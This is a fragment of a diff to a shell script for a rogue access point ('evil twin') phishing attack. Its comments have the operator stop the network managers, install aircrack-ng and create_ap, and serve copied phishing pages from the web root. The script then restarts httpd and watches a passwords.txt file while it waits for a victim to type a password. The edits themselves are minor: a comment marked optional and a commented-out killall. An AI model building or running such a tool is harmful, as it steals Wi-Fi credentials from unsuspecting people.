@@ -6,7 +6,7 @@ AP_INTERFACE=wlp0s20u1
 #	stop all network managers and daemons
 #	should be root
 #	pacman -S aircrack-ng create_ap apache php php-apache xterm 
-#	copy http files for phishing from my http to /srv/http/ or /var/www/http/ and customize
+#	copy http files for phishing from my http to /srv/http/ or /var/www/http/ and customize (optional)
 
 #	start http server
 httpd -k restart
@@ -55,7 +55,7 @@ echo "Waiting for user to enter password :"
 (xterm -e "tail -f /srv/http/passwords.txt" &)
 echo "Enter to clean up"
 read nothing
-killall xterm
+#	killall xterm
 
 #	cleanup everything
 pid=$( create_ap --list-running | grep $AP_INTERFACE | awk '{print $1}' )
